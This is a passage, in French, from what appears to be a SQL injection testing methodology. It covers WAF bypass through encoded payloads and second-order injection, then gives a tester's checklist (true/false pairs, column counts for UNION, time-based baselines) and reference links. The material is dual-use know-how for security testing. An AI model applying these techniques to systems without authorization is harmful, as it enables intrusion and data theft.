| WAF bloque les payloads de base | Filtrage sur mots-clés SQL en clair | Tester la version encodée (XML ou Unicode) après confirmation du blocage en clair | Utiliser les encodages de la section 5 | Que le WAF filtre la forme brute — ne pas conclure que l'injection est impossible sans tester les encodages |
| Second-Order non détecté en test de phase 1 | Le point d'exécution est dans une autre fonctionnalité | Cartographier toutes les fonctionnalités reutilisant des données stockées | Tester la fonctionnalité de réutilisation directement avec les mêmes payloads | Que l'absence de résultat en phase 1 n'exclut pas une injection en phase 2 |

---

## 11. Checklist d'utilisation

- [ ] Chaque paramètre de l'application (GET, POST, cookies, en-têtes journalisés) est testé séparément.
- [ ] La sonde initiale (apostrophe ou expression arithmétique) est adaptée au type de paramètre.
- [ ] La paire vraie/fausse est systématiquement testée avant de conclure à une injection ou à son absence.
- [ ] Le SGBD est identifié avant toute exploitation avancée (fonctions de délai, tables système, concaténation).
- [ ] Le nombre de colonnes est déterminé avant toute tentative UNION.
- [ ] La colonne acceptant du texte est identifiée colonne par colonne, en ne changeant qu'une position à la fois.
- [ ] La baseline temporelle est mesurée avant tout test time-based.
- [ ] Un délai ou une différence isolée non reproductible n'est pas documenté comme preuve.
- [ ] Les tests sur des environnements de production évitent les payloads modifiants (`OR 1=1` dans un DELETE/UPDATE).
- [ ] Les résultats importants (extraction de données, bypass d'auth) sont reproduits avant d'être documentés.

---

## 12. Sources et liens de référence

- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide — Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [MITRE CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [sqlmap — outil d'automatisation d'exploitation SQLi](https://sqlmap.org/)
